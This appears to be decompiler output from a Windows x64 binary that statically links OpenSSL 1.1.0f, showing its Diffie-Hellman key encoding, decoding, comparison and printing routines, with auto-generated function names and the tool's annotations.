//----- (0000000140047D80) ----------------------------------------------------
_BOOL8 __fastcall sub_140047D80(__int64 a1, __int64 a2)
{
  _BOOL8 result; // rax

  result = sub_140048550(a1, a2);
  if ( result )
    return (unsigned int)sub_140026AB0(
                           *(_QWORD *)(*(_QWORD *)(a2 + 32) + 32i64),
                           *(__int64 **)(*(_QWORD *)(a1 + 32) + 32i64)) == 0;
  return result;
}

//----- (0000000140047DE0) ----------------------------------------------------
__int64 __fastcall sub_140047DE0(__int64 a1, __int64 a2, int a3)
{
  return sub_140048FA0(a1, *(_QWORD *)(a2 + 32), a3, 0);
}

//----- (0000000140047E00) ----------------------------------------------------
__int64 __fastcall sub_140047E00(__int64 a1, __int64 a2, int a3)
{
  int v3; // eax

  return sub_140048FA0(a1, *(_QWORD *)(a2 + 32), a3, v3 - 39);
}
// 140047E11: variable 'v3' is possibly undefined

//----- (0000000140047E20) ----------------------------------------------------
__int64 __fastcall sub_140047E20(__int64 a1, __int64 a2, int a3)
{
  int v3; // eax

  return sub_140048FA0(a1, *(_QWORD *)(a2 + 32), a3, v3 - 38);
}
// 140047E31: variable 'v3' is possibly undefined

//----- (0000000140047E40) ----------------------------------------------------
__int64 __fastcall sub_140047E40(__int64 a1, int a2, int a3, _DWORD *a4)
{
  int v4; // edx

  v4 = a2 - 7;
  if ( v4 )
  {
    if ( v4 == 1 )
    {
      *a4 = 1;
      return 1i64;
    }
  }
  else
  {
    if ( a3 == 1 )
      return sub_140048640((__int64)a4);
    if ( !a3 )
      return sub_140048730((__int64)a4);
  }
  return 4294967294i64;
}

//----- (0000000140047E90) ----------------------------------------------------
void __fastcall sub_140047E90(__int64 a1)
{
  sub_14002D310(*(_QWORD *)(a1 + 32));
}

//----- (0000000140047EB0) ----------------------------------------------------
__int64 __fastcall sub_140047EB0(__int64 a1, __int64 a2)
{
  __int64 v3; // rdi
  __int64 v4; // rbx
  __int64 v5; // r8
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  char *v10; // [rsp+30h] [rbp-28h] BYREF
  _QWORD *v11; // [rsp+38h] [rbp-20h] BYREF
  unsigned int *v12; // [rsp+40h] [rbp-18h] BYREF
  char *v13[2]; // [rsp+48h] [rbp-10h] BYREF
  int v14; // [rsp+70h] [rbp+18h] BYREF
  unsigned int v15; // [rsp+78h] [rbp+20h] BYREF

  v3 = 0i64;
  v4 = 0i64;
  if ( !(unsigned int)sub_140067820(0i64, v13, &v15, &v11, a2) )
    return 0i64;
  sub_1400673E0(0i64, &v14, &v12, v11);
  if ( v14 != 16 )
  {
    sub_140024610(5, 108, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 62);
LABEL_13:
    sub_14004FD70(v3);
    sub_14002D310(v4);
    return 0i64;
  }
  v10 = (char *)*((_QWORD *)v12 + 1);
  v5 = *v12;
  if ( *(_UNKNOWN **)(a1 + 16) == &unk_1400F6E10 )
    v6 = sub_14007E450(0i64, &v10, v5);
  else
    v6 = sub_14007E430(0i64, &v10, v5);
  v4 = v6;
  if ( !v6 )
  {
    sub_140024610(5, 108, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 71);
    goto LABEL_13;
  }
  v7 = sub_14004FFF0(0i64, v13, v15);
  v3 = v7;
  if ( !v7 )
  {
    sub_140024610(5, 108, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 76);
    goto LABEL_13;
  }
  v8 = sub_14007DA80(v7, 0i64);
  *(_QWORD *)(v4 + 32) = v8;
  if ( !v8 )
  {
    sub_140024610(5, 108, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 82);
    goto LABEL_13;
  }
  sub_14004FD70(v3);
  sub_14001D1A0(a1, **(_DWORD **)(a1 + 16), v4);
  return 1i64;
}

//----- (0000000140048020) ----------------------------------------------------
__int64 __fastcall sub_140048020(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  _DWORD *v5; // rax
  int *v6; // rbx
  unsigned __int8 **v8; // rdx
  int v9; // eax
  unsigned int *v10; // rax
  __int64 v11; // rdi
  int v12; // ebp
  char **v13; // rax
  unsigned __int8 *v14; // [rsp+58h] [rbp+10h] BYREF

  v2 = *(_QWORD *)(a2 + 32);
  v14 = 0i64;
  v5 = sub_140047570();
  v6 = v5;
  if ( !v5 )
  {
    sub_140024610(5, 109, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 110);
LABEL_3:
    sub_14001D930(v14);
    sub_140047500((__int64)v6);
    return 0i64;
  }
  v8 = (unsigned __int8 **)(v5 + 2);
  if ( *(_UNKNOWN **)(a2 + 16) == &unk_1400F6E10 )
    v9 = sub_14007E590(v2, v8);
  else
    v9 = sub_14007E570((unsigned int *)v2, v8);
  *v6 = v9;
  if ( v9 <= 0 )
  {
    sub_140024610(5, 109, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 115);
    goto LABEL_3;
  }
  v10 = sub_14007DAA0(*(_QWORD *)(v2 + 32), 0i64);
  v11 = (__int64)v10;
  if ( !v10 )
    goto LABEL_3;
  v12 = sub_140050050(v10, &v14);
  sub_14004FD70(v11);
  if ( v12 <= 0 )
  {
    sub_140024610(5, 109, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 129);
    goto LABEL_3;
  }
  v13 = sub_14002C0F0(**(_DWORD **)(a2 + 16));
  if ( !(unsigned int)sub_140067870(a1, (__int64)v13, 16, (__int64)v6, (__int64)v14, v12) )
    goto LABEL_3;
  return 1i64;
}

//----- (0000000140048160) ----------------------------------------------------
__int64 __fastcall sub_140048160(__int64 a1, __int64 a2)
{
  int *v3; // rdi
  __int64 v4; // rbx
  __int64 v5; // r8
  __int64 v6; // rax
  _DWORD *v7; // rax
  char *v9; // [rsp+30h] [rbp-28h] BYREF
  _QWORD *v10; // [rsp+38h] [rbp-20h] BYREF
  char *v11; // [rsp+40h] [rbp-18h] BYREF
  unsigned int *v12; // [rsp+48h] [rbp-10h] BYREF
  int v13; // [rsp+70h] [rbp+18h] BYREF
  unsigned int v14; // [rsp+78h] [rbp+20h] BYREF

  v3 = 0i64;
  v4 = 0i64;
  if ( (unsigned int)sub_1400675F0(0i64, &v11, &v14, &v10, a2) )
  {
    sub_1400673E0(0i64, &v13, &v12, v10);
    if ( v13 == 16
      && (v3 = (int *)sub_14004FFF0(0i64, &v11, v14)) != 0i64
      && ((v9 = (char *)*((_QWORD *)v12 + 1), v5 = *v12, *(_UNKNOWN **)(a1 + 16) != &unk_1400F6E10)
        ? (v6 = sub_14007E430(0i64, &v9, v5))
        : (v6 = sub_14007E450(0i64, &v9, v5)),
          (v4 = v6) != 0) )
    {
      v7 = sub_1400273B0();
      *(_QWORD *)(v4 + 40) = v7;
      if ( v7 && sub_14007DA80((__int64)v3, (__int64)v7) )
      {
        if ( (unsigned int)sub_14004FC60(v4) )
        {
          sub_14001D1A0(a1, **(_DWORD **)(a1 + 16), v4);
          sub_140047350(v3);
          return 1i64;
        }
      }
      else
      {
        sub_140024610(5, 110, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 181);
      }
    }
    else
    {
      sub_140024610(5, 110, 114, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 195);
    }
    sub_14002D310(v4);
    sub_140047350(v3);
  }
  return 0i64;
}

//----- (00000001400482D0) ----------------------------------------------------
__int64 __fastcall sub_1400482D0(__int64 a1, __int64 a2)
{
  _DWORD *v4; // rax
  int *v5; // rdi
  unsigned int *v6; // rcx
  unsigned __int8 **v7; // rdx
  int v8; // eax
  unsigned int *v9; // rax
  int *v10; // rbp
  int v11; // ebx
  char **v12; // rax
  int v14; // [rsp+20h] [rbp-38h]
  unsigned __int8 *v15; // [rsp+70h] [rbp+18h] BYREF

  v15 = 0i64;
  v4 = sub_140047570();
  v5 = v4;
  if ( !v4 )
  {
    v14 = 212;
LABEL_3:
    sub_140024610(5, 111, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", v14);
    goto LABEL_13;
  }
  v6 = *(unsigned int **)(a2 + 32);
  v7 = (unsigned __int8 **)(v4 + 2);
  if ( *(_UNKNOWN **)(a2 + 16) == &unk_1400F6E10 )
    v8 = sub_14007E590((__int64)v6, v7);
  else
    v8 = sub_14007E570(v6, v7);
  *v5 = v8;
  if ( v8 <= 0 )
  {
    v14 = 218;
    goto LABEL_3;
  }
  v5[1] = 16;
  v9 = sub_14007DAA0(*(_QWORD *)(*(_QWORD *)(a2 + 32) + 40i64), 0i64);
  v10 = (int *)v9;
  if ( !v9 )
  {
    sub_140024610(5, 111, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 227);
LABEL_13:
    sub_14001D930(v15);
    sub_140047500((__int64)v5);
    sub_140047350(0i64);
    return 0i64;
  }
  v11 = sub_140050050(v9, &v15);
  sub_140047350(v10);
  v12 = sub_14002C0F0(**(_DWORD **)(a2 + 16));
  if ( !(unsigned int)sub_140067670(a1, (__int64)v12, 0, 16, (__int64)v5, (__int64)v15, v11) )
    goto LABEL_13;
  return 1i64;
}

//----- (0000000140048430) ----------------------------------------------------
__int64 __fastcall sub_140048430(__int64 a1, char **a2, __int64 a3)
{
  __int64 v4; // rax

  if ( *(_UNKNOWN **)(a1 + 16) == &unk_1400F6E10 )
    v4 = sub_14007E450(0i64, a2, a3);
  else
    v4 = sub_14007E430(0i64, a2, a3);
  if ( v4 )
  {
    sub_14001D1A0(a1, **(_DWORD **)(a1 + 16), v4);
    return 1i64;
  }
  else
  {
    sub_140024610(5, 107, 5, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 255);
    return 0i64;
  }
}

//----- (00000001400484B0) ----------------------------------------------------
__int64 __fastcall sub_1400484B0(__int64 a1, unsigned __int8 **a2)
{
  bool v2; // zf
  unsigned int *v3; // rcx

  v2 = *(_QWORD *)(a1 + 16) == (_QWORD)&unk_1400F6E10;
  v3 = *(unsigned int **)(a1 + 32);
  if ( v2 )
    return sub_14007E590((__int64)v3, a2);
  else
    return sub_14007E570(v3, a2);
}

//----- (00000001400484F0) ----------------------------------------------------
__int64 __fastcall sub_1400484F0(__int64 a1)
{
  return sub_14002D770(*(_QWORD *)(a1 + 32));
}

//----- (0000000140048510) ----------------------------------------------------
__int64 __fastcall sub_140048510(__int64 a1)
{
  return sub_140027260(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 8i64));
}

//----- (0000000140048530) ----------------------------------------------------
__int64 __fastcall sub_140048530(__int64 a1)
{
  return sub_14002D5F0(*(_QWORD *)(a1 + 32));
}

//----- (0000000140048550) ----------------------------------------------------
_BOOL8 __fastcall sub_140048550(__int64 a1, __int64 a2)
{
  return !(unsigned int)sub_140026AB0(
                          *(_QWORD *)(*(_QWORD *)(a1 + 32) + 8i64),
                          *(__int64 **)(*(_QWORD *)(a2 + 32) + 8i64))
      && !(unsigned int)sub_140026AB0(
                          *(_QWORD *)(*(_QWORD *)(a1 + 32) + 16i64),
                          *(__int64 **)(*(_QWORD *)(a2 + 32) + 16i64))
      && (*(_UNKNOWN **)(a1 + 16) != &unk_1400F6E10
       || !(unsigned int)sub_140026AB0(
                           *(_QWORD *)(*(_QWORD *)(a1 + 32) + 64i64),
                           *(__int64 **)(*(_QWORD *)(a2 + 32) + 64i64)));
}

//----- (00000001400485E0) ----------------------------------------------------
__int64 __fastcall sub_1400485E0(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx

  v2 = sub_14002D430();
  v3 = v2;
  if ( !v2 )
    return 0i64;
  if ( !(unsigned int)sub_140049330(v2, a1, -1) )
  {
    sub_14002D310(v3);
    return 0i64;
  }
  return v3;
}

//----- (0000000140048640) ----------------------------------------------------
__int64 __fastcall sub_140048640(__int64 a1)
{
  __int64 v2; // rax
  __int64 *v3; // rbx
  _QWORD *v5; // [rsp+48h] [rbp+10h] BYREF
  unsigned int *v6; // [rsp+50h] [rbp+18h] BYREF

  v2 = sub_14007E6B0(a1);
  v3 = (__int64 *)v2;
  if ( !v2 )
    return 0i64;
  if ( !sub_14001C740(v2) )
  {
    if ( !(unsigned int)sub_14007EEA0(a1, &v5, &v6, 0i64, 0i64, 0i64) || !v5 || !v6 )
      return 0i64;
    if ( !sub_140048B30((__int64)v3, v5, v6) )
    {
      sub_140024610(5, 114, 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 725);
      return 0i64;
    }
  }
  if ( (unsigned int)sub_140048CF0(v3, a1) )
    return 1i64;
  sub_140024610(5, 114, 113, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 731);
  return 0i64;
}

//----- (0000000140048730) ----------------------------------------------------
__int64 __fastcall sub_140048730(__int64 a1)
{
  unsigned int v1; // ebx
  __int64 v3; // rdi
  void *v4; // r13
  __int64 result; // rax
  __int64 *v6; // rsi
  __int64 jumpbuf_sp; // r14
  unsigned int *v8; // rax
  __int64 v9; // r14
  int v10; // r12d
  char **v11; // rax
  int v12; // r14d
  _BYTE *v13; // r14
  unsigned int *v14; // rax
  unsigned int v15; // r12d
  char **v16; // rax
  unsigned int v17; // r15d
  __int64 v18; // rax
  size_t v19; // r14
  struct _xDISPATCHER_CONTEXT *v20; // rax
  int v21; // eax
  int v22; // r14d
  _DWORD *v23; // rax
  __int64 v24; // rsi
  char **v25; // rax
  unsigned int *v26; // [rsp+30h] [rbp-28h] BYREF
  __FrameHandler3::TryBlockMap *v27; // [rsp+38h] [rbp-20h] BYREF
  char **v28; // [rsp+40h] [rbp-18h] BYREF
  unsigned __int8 *v29; // [rsp+98h] [rbp+40h] BYREF
  __int64 *v30; // [rsp+A0h] [rbp+48h] BYREF
  __int64 v31; // [rsp+A8h] [rbp+50h] BYREF

  v1 = 0;
  v3 = 0i64;
  v29 = 0i64;
  v4 = 0i64;
  result = sub_14007E6B0(a1);
  v6 = (__int64 *)result;
  if ( result )
  {
    jumpbuf_sp = _except_get_jumpbuf_sp(result);
    if ( (unsigned int)sub_14007EEA0(a1, &v30, &v31, 0i64, 0i64, 0i64) )
    {
      sub_1400673E0(&v28, 0i64, 0i64, v30);
      if ( v28 == sub_14002C0F0(0) )
      {
        v8 = sub_14007DAA0(*(_QWORD *)(*(_QWORD *)(jumpbuf_sp + 32) + 32i64), 0i64);
        v9 = (__int64)v8;
        if ( !v8 )
          goto LABEL_34;
        v10 = sub_140050050(v8, &v29);
        sub_14004FD70(v9);
        if ( v10 <= 0 )
          goto LABEL_34;
        sub_1400476D0(v31, (__int64)v29, v10);
        *(_DWORD *)(v31 + 16) &= 0xFFFFFFF0;
        *(_DWORD *)(v31 + 16) |= 8u;
        v29 = 0i64;
        v11 = sub_14002C0F0(0x398u);
        sub_140067440(v30, (__int64)v11, -1, 0i64);
      }
      v12 = sub_140020440(v6, 920, 1024, 0x1006u, 0xFFFFFFFE, 0i64);
      if ( v12 > 0 )
      {
        if ( (unsigned int)sub_140020440(v6, 920, 1024, 0x1008u, 0, (__int64)&v26) )
        {
          if ( v12 == 1 )
          {
            if ( (int)sub_140020440(v6, 920, 1024, 0x1006u, 2u, 0i64) <= 0 )
              goto LABEL_34;
          }
          else if ( v12 != 2 )
          {
            goto LABEL_34;
          }
          if ( v26 )
          {
            if ( (unsigned int)sub_14001D4F0(v26) != 64 )
              goto LABEL_34;
          }
          else
          {
            v26 = (unsigned int *)sub_14005BAC0();
            if ( (int)sub_140020440(v6, 920, 1024, 0x1007u, 0, (__int64)v26) <= 0 )
              goto LABEL_34;
          }
          if ( !(unsigned int)sub_14007EE10(a1, &v30, &v27) )
            goto LABEL_34;
          v13 = (_BYTE *)sub_14007EE80(a1);
          v14 = (unsigned int *)sub_140021BD0((__int64)v13);
          v15 = sub_140024FD0(v14);
          v16 = sub_14002C0F0(v15);
          if ( (int)sub_140020440(v6, 920, 1024, 0x100Du, 0, (__int64)v16) <= 0 )
            goto LABEL_34;
          v17 = sub_140024D30((__int64)v13);
          v3 = sub_140067420();
          if ( !v3 )
            goto LABEL_34;
          *(_QWORD *)v3 = sub_14002C0F0(v15);
          v18 = sub_14004FF40();
          *(_QWORD *)(v3 + 8) = v18;
          if ( !v18 || (int)sub_140024EC0(v13, v18) <= 0 )
            goto LABEL_34;
          if ( !(unsigned int)sub_14003F270(*(_QWORD **)(v3 + 8)) )
          {
            sub_14004FF20(*(unsigned int **)(v3 + 8));
            *(_QWORD *)(v3 + 8) = 0i64;
          }
          if ( (int)sub_140020440(v6, 920, 1024, 0x1009u, v17, 0i64) <= 0 )
            goto LABEL_34;
          if ( !v27 )
          {
            LODWORD(v19) = 0;
LABEL_29:
            if ( (int)sub_140020440(v6, 920, 1024, 0x100Bu, v19, (__int64)v4) > 0 )
            {
              v29 = 0i64;
              v21 = sub_140067560((unsigned int *)v3, &v29);
              v22 = v21;
              if ( v29 )
              {
                if ( v21 )
                {
                  v23 = sub_140047570();
                  v24 = (__int64)v23;
                  if ( v23 )
                  {
                    sub_1400476D0((__int64)v23, (__int64)v29, v22);
                    v29 = 0i64;
                    v25 = sub_14002C0F0(0xF5u);
                    sub_140067440(v30, (__int64)v25, 16, v24);
                    v1 = 1;
                  }
                }
              }
            }
            goto LABEL_34;
          }
          v19 = (int)sub_14001D4F0((unsigned int *)v27);
          v20 = __FrameHandler3::TryBlockMap::getpDC(v27);
          v4 = sub_14003BAB0(v20, v19);
          if ( v4 )
            goto LABEL_29;
        }
      }
    }
LABEL_34:
    sub_14001D930(v29);
    sub_1400673C0((unsigned int *)v3);
    return v1;
  }
  return result;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);

//----- (0000000140048B30) ----------------------------------------------------
_BOOL8 __fastcall sub_140048B30(__int64 a1, _QWORD *a2, unsigned int *a3)
{
  BOOL v3; // ebx
  __int64 v6; // rbp
  _DWORD *v7; // rdi
  __int64 v8; // r14
  __int64 jumpbuf_sp; // rax
  __int64 v10; // rsi
  unsigned int v11; // r15d
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v15; // [rsp+30h] [rbp-48h] BYREF
  struct _xDISPATCHER_CONTEXT *v16; // [rsp+38h] [rbp-40h] BYREF
  __int64 v17[7]; // [rsp+40h] [rbp-38h] BYREF
  int v18; // [rsp+98h] [rbp+20h] BYREF

  v3 = 0;
  v6 = 0i64;
  v7 = 0i64;
  v8 = 0i64;
  sub_1400673E0(&v15, &v18, v17, a2);
  if ( (unsigned int)sub_14002C260(v15) == 920 && v18 != 5 )
  {
    jumpbuf_sp = _except_get_jumpbuf_sp(a1);
    v10 = jumpbuf_sp;
    if ( jumpbuf_sp )
    {
      if ( *(_DWORD *)jumpbuf_sp == 920 )
      {
        v8 = sub_1400485E0(*(_QWORD *)(jumpbuf_sp + 32));
        v11 = sub_14001D4F0(a3);
        v16 = __FrameHandler3::TryBlockMap::getpDC((__FrameHandler3::TryBlockMap *)a3);
        if ( v16 )
        {
          if ( v11 )
          {
            v12 = sub_14004FFF0(0i64, (char **)&v16, v11);
            v6 = v12;
            if ( v12 )
            {
              v13 = sub_14007DA80(v12, 0i64);
              *(_QWORD *)(v8 + 32) = v13;
              if ( v13 )
              {
                v7 = sub_14001D530();
                if ( v7 )
                {
                  sub_14001D1A0((__int64)v7, **(_DWORD **)(v10 + 16), v8);
                  v8 = 0i64;
                  v3 = (int)sub_140020C80(a1, v7) > 0;
                }
              }
              else
              {
                sub_140024610(5, 115, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 614);
              }
            }
            else
            {
              sub_140024610(5, 115, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 608);
            }
          }
        }
      }
    }
  }
  sub_14004FD70(v6);
  sub_14001D3C0((__int64)v7);
  sub_14002D310(v8);
  return v3;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);
// 140048B30: using guessed type __int64 var_38[7];

//----- (0000000140048CF0) ----------------------------------------------------
__int64 __fastcall sub_140048CF0(__int64 *a1, __int64 a2)
{
  unsigned int v3; // ebx
  __int64 *v5; // r14
  void *v6; // rsi
  size_t v7; // r12
  void *v8; // rax
  __int64 v9; // rax
  _DWORD *v10; // rdi
  unsigned int v11; // eax
  char *v12; // rax
  __int64 v13; // rax
  unsigned int *v14; // rbp
  unsigned int v15; // eax
  unsigned int v16; // eax
  char **v17; // rax
  struct _xDISPATCHER_CONTEXT *v18; // rax
  char *v20; // [rsp+30h] [rbp-38h] BYREF
  __int64 *v21; // [rsp+80h] [rbp+18h] BYREF
  __FrameHandler3::TryBlockMap *v22; // [rsp+88h] [rbp+20h] BYREF

  v3 = 0;
  v5 = 0i64;
  v6 = 0i64;
  LODWORD(v7) = 0;
  if ( (unsigned int)sub_14007EE10(a2, &v21, &v22) )
  {
    if ( (unsigned int)sub_14002C260(*v21) == 245 )
    {
      if ( (int)sub_140020440(a1, 920, 1024, 0x1006u, 2u, 0i64) > 0 )
      {
        v8 = sub_14005BAC0();
        if ( (int)sub_140020440(a1, 920, 1024, 0x1007u, 0, (__int64)v8) > 0 )
        {
          v9 = v21[1];
          if ( *(_DWORD *)v9 == 16 )
          {
            v20 = *(char **)(*(_QWORD *)(v9 + 8) + 8i64);
            v5 = (__int64 *)sub_140067540(0i64, &v20, **(unsigned int **)(v21[1] + 8));
            if ( v5 )
            {
              v10 = (_DWORD *)sub_14007EE80(a2);
              if ( v10 )
              {
                v11 = sub_14002C260(*v5);
                v12 = sub_14002C1A0(v11);
                v13 = sub_14001E950((__int64)v12);
                v14 = (unsigned int *)v13;
                if ( v13 )
                {
                  if ( (sub_140024CF0(v13) & 0xF0007) == 65538 )
                  {
                    if ( (unsigned int)sub_14001C050(v10, (int *)v14, 0i64, 0i64, 0i64) )
                    {
                      if ( (int)sub_140024D90((__int64)v10, v5[1]) > 0 )
                      {
                        v15 = sub_140024D30((__int64)v10);
                        if ( (int)sub_140020440(a1, 920, 1024, 0x1009u, v15, 0i64) > 0 )
                        {
                          v16 = sub_140024FD0(v14);
                          v17 = sub_14002C0F0(v16);
                          if ( (int)sub_140020440(a1, 920, 1024, 0x100Du, 0, (__int64)v17) > 0 )
                          {
                            if ( !v22
                              || (v7 = (int)sub_14001D4F0((unsigned int *)v22),
                                  v18 = __FrameHandler3::TryBlockMap::getpDC(v22),
                                  (v6 = sub_14003BAB0(v18, v7)) != 0i64) )
                            {
                              if ( (int)sub_140020440(a1, 920, 1024, 0x100Bu, v7, (__int64)v6) > 0 )
                              {
                                v6 = 0i64;
                                v3 = 1;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    else
    {
      sub_140024610(5, 116, 112, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 653);
    }
  }
  sub_1400673C0((unsigned int *)v5);
  sub_14001D930(v6);
  return v3;
}

//----- (0000000140048FA0) ----------------------------------------------------
__int64 __fastcall sub_140048FA0(__int64 a1, __int64 a2, int a3, int a4)
{
  __int16 v4; // ax
  int v5; // esi
  __int16 v6; // r13
  __int64 v10; // r15
  __int64 v11; // r12
  const char *v13; // r14
  unsigned int v14; // eax
  int v15; // ebp
  __int64 v16; // r8
  __int64 v17; // r8
  __int64 v18; // r14
  __int16 *v19; // r9
  __int64 v20; // r8

  v5 = 0;
  v6 = v4 - 41;
  if ( a4 == 2 )
  {
    v10 = *(_QWORD *)(a2 + 40);
    v11 = *(_QWORD *)(a2 + 32);
  }
  else
  {
    v10 = 0i64;
    if ( a4 <= 0 )
      v11 = 0i64;
    else
      v11 = *(_QWORD *)(a2 + 32);
  }
  if ( !*(_QWORD *)(a2 + 8) )
    goto LABEL_9;
  if ( a4 == 2 )
  {
    if ( !v10 )
    {
LABEL_9:
      v6 = 67;
      goto LABEL_10;
    }
  }
  else if ( a4 <= 0 )
  {
    goto LABEL_14;
  }
  if ( !v11 )
    goto LABEL_9;
LABEL_14:
  if ( a4 == 2 )
  {
    v13 = "DH Private-Key";
  }
  else
  {
    v13 = "DH Public-Key";
    if ( a4 != 1 )
      v13 = "DH Parameters";
  }
  sub_140029E80(a1, a3, 128);
  v14 = sub_140027260(*(_QWORD *)(a2 + 8));
  if ( (int)sub_14002A590(a1, "%s: (%d bit)\n", v13, v14) <= 0 )
    goto LABEL_10;
  v15 = a3 + 4;
  if ( !(unsigned int)sub_1400670C0(a1, "private-key:", v10, 0i64, v15) )
    goto LABEL_10;
  if ( !(unsigned int)sub_1400670C0(a1, "public-key:", v11, 0i64, v15) )
    goto LABEL_10;
  if ( !(unsigned int)sub_1400670C0(a1, "prime:", *(_QWORD *)(a2 + 8), 0i64, v15) )
    goto LABEL_10;
  if ( !(unsigned int)sub_1400670C0(a1, "generator:", *(_QWORD *)(a2 + 16), 0i64, v15) )
    goto LABEL_10;
  v16 = *(_QWORD *)(a2 + 64);
  if ( v16 )
  {
    if ( !(unsigned int)sub_1400670C0(a1, "subgroup order:", v16, 0i64, v15) )
      goto LABEL_10;
  }
  v17 = *(_QWORD *)(a2 + 72);
  if ( v17 )
  {
    if ( !(unsigned int)sub_1400670C0(a1, "subgroup factor:", v17, 0i64, v15) )
      goto LABEL_10;
  }
  if ( *(_QWORD *)(a2 + 80) )
  {
    sub_140029E80(a1, v15, 128);
    sub_14002A1A0(a1, (__int64)"seed:");
    if ( *(int *)(a2 + 88) > 0 )
    {
      v18 = 0i64;
      while ( v5 != 15 * (v5 / 15)
           || (int)sub_14002A1A0(a1, (__int64)"\n") > 0 && (unsigned int)sub_140029E80(a1, v15 + 4, 128) )
      {
        v19 = word_1400F6B40;
        if ( ++v5 == *(_DWORD *)(a2 + 88) )
          v19 = (__int16 *)byte_1400D7DAE;
        if ( (int)sub_14002A590(a1, "%02x%s", *(unsigned __int8 *)(*(_QWORD *)(a2 + 80) + v18), v19) <= 0 )
          break;
        ++v18;
        if ( v5 >= *(_DWORD *)(a2 + 88) )
          goto LABEL_37;
      }
      goto LABEL_10;
    }
LABEL_37:
    if ( (int)sub_14002A430(a1, (__int64)"\n", 1u) <= 0 )
      return 0i64;
  }
  if ( (v20 = *(_QWORD *)(a2 + 96)) != 0 && !(unsigned int)sub_1400670C0(a1, "counter:", v20, 0i64, v15)
    || *(_DWORD *)(a2 + 24)
    && (sub_140029E80(a1, v15, 128),
        (int)sub_14002A590(a1, "recommended-private-length: %d bits\n", *(unsigned int *)(a2 + 24)) <= 0) )
  {
LABEL_10:
    sub_140024610(5, 100, v6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_ameth.c", 343);
    return 0i64;
  }
  return 1i64;
}
// 140048FC1: variable 'v4' is possibly undefined
// 1400F6B40: using guessed type __int16 word_1400F6B40[16];

//----- (00000001400492D0) ----------------------------------------------------
__int64 __fastcall sub_1400492D0(_DWORD **a1, __int64 a2)
{
  __int64 result; // rax
  _DWORD *v4; // rbx

  if ( !a2 )
  {
    v4 = 0i64;
    goto LABEL_5;
  }
  result = (__int64)sub_140026F70(a2);
  v4 = (_DWORD *)result;
  if ( result )
  {
LABEL_5:
    sub_140026FF0(*a1);
    *a1 = v4;
    return 1i64;
  }
  return result;
}

//----- (0000000140049330) ----------------------------------------------------
__int64 __fastcall sub_140049330(__int64 a1, __int64 a2, int a3)
{
  BOOL v3; // esi
  __int64 v6; // rcx
  _DWORD *v7; // rbp
  __int64 result; // rax
  __int64 v9; // rcx
  __int64 v10; // rbp
  const void *v11; // rcx
  void *v12; // rax

  v3 = a3;
  if ( a3 == -1 )
    v3 = *(_QWORD *)(a2 + 64) != 0i64;
  v6 = *(_QWORD *)(a2 + 8);
  if ( v6 )
  {
    v7 = sub_140026F70(v6);
    if ( !v7 )
      return 0i64;
  }
  else
  {
    v7 = 0i64;
  }
  sub_140026FF0(*(_DWORD **)(a1 + 8));
  *(_QWORD *)(a1 + 8) = v7;
  v9 = *(_QWORD *)(a2 + 16);
  if ( v9 )
  {
    result = (__int64)sub_140026F70(v9);
    v10 = result;
    if ( !result )
      return result;
  }
  else
  {
    v10 = 0i64;
  }
  sub_140026FF0(*(_DWORD **)(a1 + 16));
  *(_QWORD *)(a1 + 16) = v10;
  if ( v3 )
  {
    if ( !(unsigned int)sub_1400492D0((_DWORD **)(a1 + 64), *(_QWORD *)(a2 + 64))
      || !(unsigned int)sub_1400492D0((_DWORD **)(a1 + 72), *(_QWORD *)(a2 + 72)) )
    {
      return 0i64;
    }
    sub_14001D930(*(void **)(a1 + 80));
    *(_QWORD *)(a1 + 80) = 0i64;
    *(_DWORD *)(a1 + 88) = 0;
    v11 = *(const void **)(a2 + 80);
    if ( v11 )
    {
      v12 = sub_14003BAB0(v11, *(int *)(a2 + 88));
      *(_QWORD *)(a1 + 80) = v12;
      if ( !v12 )
        return 0i64;
      *(_DWORD *)(a1 + 88) = *(_DWORD *)(a2 + 88);
    }
  }
  else
  {
    *(_DWORD *)(a1 + 24) = *(_DWORD *)(a2 + 24);
  }
  return 1i64;
}

//----- (0000000140049460) ----------------------------------------------------
__int64 __fastcall sub_140049460(__int64 a1, char **a2, __int64 a3)
{
  __int64 v4; // rax

  v4 = sub_14005EBD0(0i64, a2, a3);
  if ( v4 )
  {
    sub_14001D1A0(a1, 116, v4);
    return 1i64;
  }
  else
  {
    sub_140024610(10, 119, 10, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_ameth.c", 376);
    return 0i64;
  }
}

//----- (00000001400494D0) ----------------------------------------------------
